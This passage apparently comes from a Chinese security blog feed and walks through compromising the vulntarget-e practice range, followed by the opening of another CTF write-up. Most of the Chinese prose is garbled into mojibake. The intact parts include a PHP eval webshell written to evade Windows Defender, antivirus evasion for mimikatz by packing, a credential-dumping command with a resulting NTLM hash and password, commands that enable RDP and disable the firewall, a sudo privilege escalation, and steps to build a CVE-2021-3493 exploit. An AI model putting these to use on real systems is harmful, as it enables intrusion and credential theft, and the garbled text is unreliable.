alt="image-20221129221150992"></p><h3 id="OVAS-PHP-æ¼æ´æ‹¿shellï¼Œå…æ€df"><a href="#OVAS-PHP-æ¼æ´æ‹¿shellï¼Œå…æ€df" class="headerlink" title="OVAS - PHP æ¼æ´æ‹¿shellï¼Œå…æ€df"></a>OVAS - PHP æ¼æ´æ‹¿shellï¼Œå…æ€df</h3><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªcmsï¼Œåˆšå¼€å§‹æ‰“çš„æ—¶å€™ï¼Œæˆ‘å»googleäº†ä¸€åœˆä¹Ÿæ‰¾åˆ°åˆ©ç”¨çš„æ–¹æ³•ï¼Œç”šè‡³è¿æåˆ°è¿™ä¸ªcmsçš„æ–‡ç« éƒ½å¾ˆå°‘ï¼Œï¼ˆé™¤äº†å…¶ä»–ä½¬å†™çš„wpï¼‰ï¼Œå°±å»æ‰«äº†ç›®å½•çœ‹çœ‹æœ‰å•¥æç¤ºã€‚ç„¶åå›æ¥å†çœ‹çœ‹å‘ç°å³ä¸Šè§’æœ‰ä¸ªadminlogin ï¼Œè¯•ç€æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬çœ‹åˆ°usernameï¼Œpasswordéƒ½æ˜¯æ˜æ–‡ä¸”æ²¡æœ‰éªŒè¯ç ï¼Œå­˜åœ¨çˆ†ç ´çš„æ¡ä»¶ï¼Œæˆ‘ä»¬åŠ è½½å­—å…¸çˆ†ç ´ä¸€ä¸‹ã€‚çˆ†ç ´æˆåŠŸadminï¼Œadmin123</p><p><img src="/images/vulntarget-e/image-20221129221707205.png" alt="image-20221129221707205"></p><p><img src="/images/vulntarget-e/image-20221129221813516.png" alt="image-20221129221813516"></p><p>æˆ‘ä»¬ç™»å½•åå°ï¼Œé‚£è‚¯å®šæ˜¯æƒ³åŠæ³•æ‹¿shelläº†ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å•¥ä¸Šä¼ ç‚¹ï¼Œç»è¿‡æµ‹è¯•åœ¨settingsä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼Œsettingsä¸­åœ¨welcomeä¸­æ·»åŠ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶ååœ¨éšä¾¿é€‰ä¸€ä¸ªå›¾ç‰‡ï¼Œç‚¹æœ€ä¸‹é¢updateæäº¤</p><p><img src="/images/vulntarget-e/image-20221130103146247.png" alt="image-20221130103146247"></p><p>ç„¶ååœ¨ä½ æ’çš„é‚£å¼ å›¾ç‰‡ä¸­çš„base64ç¼–ç ä¸­æ’å…¥ä¸€å¥è¯ï¼Œåœ¨æœ€å¼€å§‹æ²¡çœ‹wpçš„æ—¶å€™ï¼Œæˆ‘å°±å†™äº†ç®€å•çš„phpinfoæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæˆ‘ä¸Šä¼ æ™®é€šä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶å°±æŠ¥é”™ï¼Œä¸»é¡µé¢æ˜¾ç¤ºincludeé”™è¯¯ï¼Œä»¥ä¸ºæ˜¯å“ªé‡Œæ‰“é”™äº†ï¼Œç½‘ç«™å´©äº†ï¼Œåæ¥å‘ç°å¹¶ä¸æ˜¯ï¼Œæˆ‘ç™»ä¸Šå»winå‘ç°ï¼Œwinä¸Šå¼€çš„æœ‰dfï¼Œç›´æ¥æŠŠæˆ‘çš„ğŸå„¿æ€äº†ï¼Œphpinfoä¸æ€ï¼Œä¸è¿‡ä¹Ÿæ²¡å…³ç³»ï¼Œdfå¯¹webshellæŸ¥æ€çš„èƒ½åŠ›æ¯”è¾ƒå·®ï¼Œç½‘ä¸Šéšä¾¿æ‰¾ä¸ªç®€å•å…æ€å°±èƒ½è¿‡ã€‚è¿™é‡Œç¬”è€…æä¾›ä¸€ä¸ªã€‚æ—¢ç„¶ç™»ä¸Šå»äº†ï¼Œç¬”è€…å°±æŠŠdfæ›´æ–°åˆ°æœ€æ–°ç‰ˆäº†ï¼Œè¿™ä¸ªğŸå„¿ä¾ç„¶èƒ½ç”¨ã€‚ä¸‹é¢éƒ½æ˜¯åŸºäºåšæ–°ç‰ˆçš„dfï¼Œtime-22.11.28</p><p><img src="/images/vulntarget-e/image-20221130200829649.png" alt="image-20221130200829649"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bohemian</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/*bohemian*/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;g&#x27;</span>].<span class="string">&quot;/*bohemian**/&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">@<span class="keyword">eval</span>(bohemian());phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130104355866.png" alt="image-20221130104355866"></p><p>è¿™é‡ŒæŠŠåŒ…å‘è¿‡å»å°±å¯ä»¥äº†ï¼Œé‡Œé¢æœ‰ä¸ªphpinfo æˆ‘ä»¬æ–¹ä¾¿æŸ¥çœ‹ï¼Œå»åˆ°ä¸»é¡µçœ‹çœ‹</p><p><img src="/images/vulntarget-e/image-20221130103829535.png" alt="image-20221130103829535"></p><p><img src="/images/vulntarget-e/image-20221130110109643.png" alt="image-20221130110109643"></p><p>æ²¡æœ‰é—®é¢˜ï¼Œèšå‰‘è¿ä¸€ä¸‹ã€‚æˆåŠŸæ‹¿åˆ°shell</p><p><img src="/images/vulntarget-e/image-20221130110051787.png" alt="image-20221130110051787"></p><p>ä¸Šæ¥å°±èƒ½çœ‹åˆ°systemæƒé™ï¼Œä¸”æœ‰ä¸¤å—ç½‘å¡ï¼Œå†…éƒ¨è¿˜æœ‰ä¸€ä¸ª10çš„æ®µ</p><p><img src="/images/vulntarget-e/image-20221130110251974.png" alt="image-20221130110251974"></p><p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢æˆ‘ä»¬çŸ¥é“æ˜¯å¼€ç€dfçš„å…ˆå»æ¡Œé¢ç¿»ç¿»çœ‹ï¼Œæ¡Œé¢ä¸Šæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯è¿™ä¸ªç›®å½•C:/Users/Administrator/æœ‰ä¸ªflagæ–‡ä»¶ï¼Œå†…å®¹<code>vulntarget&#123;VGhlIGhvc3QgcGFzc3dvcmQgbWF5IGJlIHVzZWQgZm9yIG90aGVyIHB1cnBvc2Vz&#125;  +_+</code>å…¸å‹çš„base64  è§£ä¸€ä¸‹ï¼Œ<code>The host password may be used for other purposes</code>ç¬”è€…å·¥åœ°è‹±è¯­ç¿»ä¸€ä¸‹ï¼Œå¤§è‡´çš„æ„æ€æ˜¯è¿™ä¸ªç”µè„‘çš„å¯†ç ä¼šè¢«ç”¨åˆ°å…¶ä»–åœ°æ–¹ã€‚é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šå»æŠ“å¯†ç äº†ã€‚é‚£å°±åœ¨è¿™ç½‘ç«™è·¯å¾„ä¸‹ç©¿ä¸ªmimikatzï¼Œå½“ç„¶æˆ‘ä»¬ä¼ ä¸Šå»è‚¯å®šç§’æ€ï¼Œdfå¯¹mimikatzéå¸¸æ•æ„Ÿçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å‘¢å»åšä¸€ä¸ªç®€å•å…æ€ã€‚</p><p>å¦‚æœæƒ³æ·±å…¥ç ”ç©¶mimikatzçš„å…æ€ï¼Œå‚è€ƒè¿™ä½ä½¬çš„æ–‡ç« ï¼ŒMimikatzçš„18ç§å…æ€å§¿åŠ¿åŠé˜²å¾¡ç­–ç•¥<code>https://www.freebuf.com/news/234365.html</code></p><p>è¿™é‡Œç¬”è€…æä¾›ä¸€ç§éå¸¸ç®€å•çš„å…æ€æ“ä½œï¼Œå°±æ˜¯åŠ å£³ï¼Œéå¸¸ç®€å•æ‹¿å·¥å…·å»ç”Ÿæˆä¸€ä¸ªå°±è¡Œã€‚</p><p><code>å½“ç„¶è¿™é‡Œå…æ€çš„æ“ä½œå…¶å®éƒ½å¯ä»¥ä¸åšï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºä¸Šé¢å…¶å®æˆ‘ä»¬å·²ç»æ˜¯systemæƒé™äº†ï¼Œæˆ‘ä»¬å…¶å®æŠŠdfå…³æ‰å°±è¡Œï¼Œä½†æ˜¯è¿™é‡Œæ˜¯é¶åœºï¼Œè”ç³»ä¸€ä¸‹æ²¡æœ‰åå¤„</code></p><p>ä¸‹é¢æˆ‘ä»¬å…ˆå¯¹mimikatzå…æ€ï¼Œæ‰“å¼€VMProtect,é€‰æ‹©mimikatzå°±è¡Œäº†ï¼Œä»–å°±ä¼šç¼–è¯‘äº†ï¼Œç„¶åä¼šç”Ÿæˆmimikatzvm.vmp.exeï¼ŒæŠŠè¿™ä¸ªä¼ ä¸Šå»å°±è¡Œäº†</p><p><img src="/images/vulntarget-e/image-20221130112521657.png" alt="image-20221130112521657"></p><p><img src="/images/vulntarget-e/image-20221130112528427.png" alt="image-20221130112528427"></p><p>è¿™é‡Œæ²¡æœ‰äº¤äº’å¼shellæˆ‘ä»¬ç”¨mimikatzæŠ“çš„è¯ï¼Œç›´æ¥å¯¼å‡ºç»“æœå°±è¡Œ</p><p><code>mimikatzvm.vmp.exe &quot;sekurlsa::logonpasswords&quot; exit &gt; s.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msv :</span><br><span class="line"> [00000005] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : WIN-JJJBQ4N87RA</span><br><span class="line"> * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line"> * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>dfc8d2bfa540a0a6e2248a82322e654e<br>ntlm<br>Admin#123</p><p>md5ç½‘ç«™è§£ä¸€ä¸‹å°±æœ‰äº†ï¼Œ</p><p>æˆ‘ä»¬åœ¨ä¸Šä¸ªfscanæ‰«ä¸‹ä¸‹ä¸ªç½‘æ®µï¼Œä¸Šä¸ªwinçš„ï¼Œè¿™é‡Œä¸Šä¼ ä¸Šå»ç›´æ¥æŠ¥æ¯’äº†ï¼Œç„¶åæ€æ‰äº†</p><p><img src="/images/vulntarget-e/image-20221130201732733.png" alt="image-20221130201732733"></p><p>æ²¡å…³ç³»ï¼Œæœ‰ä¸ªå¸ˆå‚…äºŒå¼€äº†fscançš„ï¼Œ<code>https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</code>æˆ‘ä»¬å»è¯•ä¸€ä¸‹ï¼Œ</p><p>è¿™ä¸ªæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œ20å¤šmï¼Œèšå‰‘è¶…æ—¶çš„è¯å°±ä¸Šä¼ å¤±è´¥äº†ï¼Œæˆ‘ä»¬æ”¹ä¸€ä¸‹è¶…æ—¶æ—¶é—´ï¼Œæ”¹å¤§ç‚¹</p><p><img src="/images/vulntarget-e/image-20221130202142743.png" alt="image-20221130202142743"></p><p>ç¬”è€…åœ¨è¿™é‡Œä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯ä¸èƒ½ç”¨ï¼Œç¬”è€…åˆä¼ äº†ä¸€éï¼Œè¿™æ ·çš„è¯ä¸‰æ¬¡äº†ï¼Œå…¨éƒ¨å åŠ äº†ä¸€èµ·å¹¶æ²¡æœ‰è¦†ç›–ï¼Œæˆ‘ä»¬ä»æ–°æ”¹ä¸ªåå­—ä¼ ï¼Œæˆ–è€…åˆ äº†åˆä¼ äº†å‡ éï¼Œè¿˜æ˜¯æ²¡æˆåŠŸï¼Œå¯èƒ½æ˜¯ä»£ç†çš„é—®é¢˜ï¼Œæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œä½œè€…è¯´äº†ï¼Œè¿™é‡Œæ‰“åŒ…å‡ºæ¥çš„fscanå°±æ˜¯è¿™ä¹ˆå¤§æ²¡æœ‰å‹ç¼©ï¼Œå¯ä»¥è‡ªå·±å‹ç¼©ï¼Œupxå‹ä¸€ä¸‹ï¼Œæˆ–è€…ä¸Šé¢é‚£ä¸ªå·¥å…·ï¼Œæˆ‘ä»¬è¯•ä¸‹godzillaå¤§æ–‡ä»¶ä¸Šä¼ </p><p><img src="/images/vulntarget-e/image-20221130202622434.png" alt="image-20221130202622434"></p><p><img src="/images/vulntarget-e/image-20221130202834288.png" alt="image-20221130202834288"></p><p>è¿™é‡Œå°tipï¼Œå“¥æ–¯æ‹‰æ˜¯å¯ä»¥è¿æ¥ä¸€å¥è¯çš„ã€‚æ‰€ä»¥ç›´æ¥è¿å°±è¡Œ</p><p><img src="/images/vulntarget-e/image-20221130204635575.png" alt="image-20221130204635575"></p><p>è¿™é‡Œå“¥æ–¯æ‹‰ä¼ ä¸Šæ¥æ²¡æœ‰é—®é¢˜ï¼Œå›¾æ²¡æˆª</p><p><img src="/images/vulntarget-e/image-20221130205528351.png" alt="image-20221130205528351"></p><p>.\fscan_win_amd64.exe -h 10.0.10.0/24 -o r.txt</p><p><img src="/images/vulntarget-e/image-20221130205706916.png" alt="image-20221130205706916"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ª20çš„æ®µ 110çš„ipåªå¼€äº†22ç«¯å£ï¼Œæ˜¾ç„¶æ˜¯å°linuxäº†ï¼Œä¼°è®¡åˆæ˜¯å¼±å£ä»¤ï¼Œæˆ–è€…æ¼æ´äº†ã€‚</p><p>æ­£å¸¸æ€è·¯æ˜¯ä¸Šewï¼Œç„¶åæ‰“åä¸€ä¸ªç½‘ç«¯ï¼Œä½†æ˜¯è¿™é‡Œä¸æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬è¦è·å–è¿œç¨‹æ¡Œé¢ï¼Œå¼€ä¸‹3389å…¶å®è¿™æ ·åšåœ¨å®æˆ˜ä¸­æ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“è¢«å‘ç°ã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯å…ˆè¦è¿™æ ·æ“ä½œã€‚</p><p>æˆ‘ä»¬å…ˆcmdæŠŠ3389å¼€äº†<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p><img src="/images/vulntarget-e/image-20221130210751420.png" alt="image-20221130210751420"></p><p>æ‰“å¼€ä¹‹åç›´æ¥ç™»å½•å°±è¡Œäº†ï¼Œadministrator/Admin#123</p><p><img src="/images/vulntarget-e/image-20221130210947108.png" alt="image-20221130210947108"></p><p>å“¦å¯¹äº†ï¼Œå…¶å®è¿˜æ˜¯è¿ä¸ä¸Šï¼Œé˜²ç«å¢™å¼€ç€ï¼Œæˆ‘ä»¬å†æŠŠé˜²ç«å¢™å…³äº†</p><p><code>netsh advfirewall set allprofiles state off</code>\</p><p><img src="/images/vulntarget-e/image-20221130211126227.png" alt="image-20221130211126227"></p><p>å°±è¿ä¸Šæ¥äº†</p><p><img src="/images/vulntarget-e/image-20221130211216240.png" alt="image-20221130211216240"></p><p>ä¸‹é¢æœ‰ä¸€ä¸ªmobaï¼Œæˆ‘ä»¬æ‰“å¼€æ˜¯è¦å¯†ç çš„ï¼Œç„¶åè¾“ä¸€ä¸‹åˆšåˆšadministratorçš„å¯†ç ï¼Œä¸Šé¢flagè¯´äº†,å¯†ç ä¼šç”¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130211247112.png" alt="image-20221130211247112"></p><h3 id="mobaåˆ©ç”¨ã€cve-2021-3493"><a href="#mobaåˆ©ç”¨ã€cve-2021-3493" class="headerlink" title="mobaåˆ©ç”¨ã€cve_2021_3493"></a>mobaåˆ©ç”¨ã€cve_2021_3493</h3><h4 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>ç›´æ¥å°±å¯ä»¥è¿ä¸Šæ¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªvulntargetçš„æ™®é€šç”¨æˆ·ï¼Œé‚£è‚¯å®šæ˜¯æƒ³åŠæ³•ææƒï¼Œä¸Šlseç­‰ç­‰ï¼Œè¿™è¾¹ç¬”è€…æä¾›ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯é¢„æœŸè§£å’Œä¸€ä¸ªéé¢„æœŸè§£ï¼Œéé¢„æœŸè§£æ˜¯ä¸€ä¸ªç®€å•çš„ææƒæ–¹æ³•ï¼Œæœ‰å¾ˆå¤šæœºå™¨å¦‚æœä½ æœ‰äº†ä¸€ä¸ªæ™®é€šçš„å¯ä»¥ç™»å½•çš„è´¦æˆ·å¯ä»¥è¯•è¯•è¿™ä¸ªï¼Œå±¡è¯•ä¸çˆ½ã€‚sudoæ¼æ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">è¾“å…¥è¿™ä¸ªç”¨æˆ·çš„å¯†ç </span><br><span class="line">ï¼</span><br><span class="line">å‡ºå»å°±æ˜¯rootäº†</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130211440233.png" alt="image-20221130211440233"></p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“vulntargetçš„å¯†ç ï¼Œå› ä¸ºä¸Šé¢è¿›æ¥çš„æ—¶å€™æ˜¯è¾“å…¥çš„mobaçš„å®‰å…¨å¯†ç ï¼Œå¹¶ä¸æ˜¯sshçš„å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥çœ‹åˆ°çš„ï¼Œä¾æ¬¡ç‚¹å‡»settings-&gt;configuration-&gt;mobapasswords-&gt;show passs-&gt;è¿™ä¸ªpasså°±æ˜¯mobaçš„å®‰å…¨å¯†ç ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130212059351.png" alt="image-20221130212059351"></p><p><img src="/images/vulntarget-e/image-20221130212240621.png" alt="image-20221130212240621"></p><p>å³é¢å°±ä¼šæ˜¾ç¤ºå¯†ç äº†ï¼Œvuln@qweå¥½æ¥ä¸‹æ¥sudoææƒ</p><p>sudo man man</p><p>vuln@qwe</p><p>!</p><p>å›è½¦</p><p><img src="/images/vulntarget-e/image-20221130212542320.png" alt="image-20221130212542320"></p><p><img src="/images/vulntarget-e/image-20221130212417710.png" alt="image-20221130212417710"></p><p><img src="/images/vulntarget-e/image-20221130212706685.png" alt="image-20221130212706685"></p><p>è‡³æ­¤å°±æ‹¿ä¸‹äº†æœ€åä¸€å°é¶æœºï¼Œrootä¸‹æœ‰ä¸ªflagï¼Œ<code>find /* -name &quot;*flag*&quot;</code></p><p><img src="/images/vulntarget-e/image-20221130213029531.png" alt="image-20221130213029531"></p><p>ç…ä¸€çœ¼ï¼Œ</p><p>root@ubuntu:~# cat /root/flag<br>Congratulations on winning the final flag</p><p>vulntarget{cve_2021_3493_local_privilege_promotion_overlayfs}</p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª2021_3493,æ˜¯é‚£ä¸ªææƒæ¼æ´ã€‚</p><p>ç¬”è€…è¿™é‡Œè·‘äº†ä¸€ä¸‹rootå¯†ç ï¼Œæ²¡å‡ºï¼Œemmmmm</p><p><img src="/images/vulntarget-e/image-20221130220156785.png" alt="image-20221130220156785"></p><h4 id="ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£"><a href="#ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£" class="headerlink" title="ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£"></a>ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£</h4><p><code>git clone https://github.com/briskets/CVE-2021-3493</code></p><p>cdè¿›å»</p><p>æ‰¾ä¸€å°ubuntuå»å…‹éš†ä¸€ä¸‹è¿™ä¸ªexpé¡¹ç›®ï¼Œè¿™é‡Œæ³¨æ„è‹¥æ˜¯åœ¨kaliä¸Šç¼–è¯‘ï¼Œæ‹¿å‡ºæ¥å»ç›®æ ‡æœºä¸Šæ‰§è¡Œä¼šæŠ¥é”™ï¼Œæ‰¾ä¸åˆ°soæ–‡ä»¶ã€‚</p><p><code>gcc exploit.c -o exploit</code> </p><p>ç¼–è¯‘ä¸€ä¸‹ï¼Œæ‹–å‡ºæ¥åˆ°ç›®æ ‡æœºä¸Šï¼Œè¿™é‡Œæ‹–åˆ°winä¸Šä¼šæŠ¥æ¯’ï¼Œæˆ‘è¿™é‡Œç›´æ¥æŠŠdfå…³æ‰å§ï¼Œå¦‚æœä¸æƒ³å…³äº†ï¼Œå°±æ‰“ä¸ªtaråŒ…ï¼Œåˆ°ç›®æ ‡æœºä¸Šåœ¨è§£å‹ï¼Œrdpä¸èƒ½æ‹–çš„è¯ï¼Œå¯ä»¥å¤åˆ¶ç²˜è´´ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130215219417.png" alt="image-20221130215219417"></p><p>è¿™æ ·ä¹Ÿæ‹¿ä¸‹äº†è¿™å°æœºå™¨ã€‚è‡³æ­¤æ•´ä¸ªé¶åœºå°±æ‰“å®Œäº†ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>å‚è€ƒæ–‡ç« </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/crow821/vulntarget <span class="comment">#é¶åœºå®˜æ–¹åœ°å€</span></span><br><span class="line">https://mp.weixin.qq.com/s/cisoqDnsHqyzCFdx-eG5TQ <span class="comment">#ä½œè€…çš„æ­å»ºä¸æ‰“é¶è®°å½•</span></span><br><span class="line">https://www.freebuf.com/articles/web/333566.html <span class="comment">#vulntargetæ¼æ´é¶åœºç³»åˆ—ï¼ˆä¸‰ï¼‰ï¼švulntarget-c</span></span><br><span class="line">https://cloud.tencent.com/developer/article/1171183 <span class="comment">#ä¹ç§å§¿åŠ¿è¿è¡ŒMimikatz</span></span><br><span class="line">https://www.freebuf.com/news/234365.html <span class="comment">#Mimikatzçš„18ç§å…æ€å§¿åŠ¿åŠé˜²å¾¡ç­–ç•¥</span></span><br><span class="line">https://www.freebuf.com/vuls/280508.html <span class="comment">#Laravel RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´å¤ç°</span></span><br></pre></td></tr></table></figure><p>ç”¨åˆ°å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VMProtect Ultimate 3.4.0åŠ å£³è½¯ä»¶</span><br><span class="line">https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg æå–ç : emnq</span><br><span class="line">æ­¤ç™¾åº¦ç½‘ç›˜åŸé“¾åœ¨`https://www.freebuf.com/news/234365.html`ä¸­</span><br><span class="line"></span><br><span class="line">äºŒå¼€fscan</span><br><span class="line">https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</span><br></pre></td></tr></table></figure><h3 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h3><blockquote><p>å› ä¸ºä¸ªäººèƒ½åŠ›æœ‰é™ï¼Œæ–‡ç« ä¸­è‹¥æœ‰é”™è¯¯ï¼Œæ•¬è¯·æ–§æ­£<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> vulntarget-c </tag>
            
            <tag> laravel </tag>
            
            <tag> OVAS-PHPç›¸å…³æ¼æ´ </tag>
            
            <tag> éš§é“ä»£ç† </tag>
            
            <tag> å…æ€ </tag>
            
            <tag> ææƒ </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> CVE-2021-3493 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±ŠåŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›éƒ¨åˆ†wp</title>
      <link href="/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20221124111931793.png" alt="image-20221124111931793"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›éƒ¨åˆ†wp</title>
      <link href="/2022/09/29/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/29/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æƒ³ä¸è®°å½•äº† ï¼Œä¹Ÿéƒ½æ˜¯ç½‘ä¸Šèƒ½æœåˆ°çš„é¢˜ï¼Œæœ€åæƒ³äº†ä¸€ä¸‹è¿˜æ˜¯è®°å½•ä¸€ä¸‹å§</p><h2 id="ç†è®ºé¢˜"><a href="#ç†è®ºé¢˜" class="headerlink" title="ç†è®ºé¢˜"></a>ç†è®ºé¢˜</h2><p>æ²¡å•¥æ„æ€</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="æœ€å¥½çš„è¯­è¨€"><a href="#æœ€å¥½çš„è¯­è¨€" class="headerlink" title="æœ€å¥½çš„è¯­è¨€"></a>æœ€å¥½çš„è¯­è¨€</h3><p>300pt (å·²åšå‡º) è€ƒç‚¹ is_number array_search() å¼±ç±»å‹æ¯”è¾ƒ<br>èµ›é¢˜åœ°å€<code>http://ctftime1.usaas.net/web/good/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span 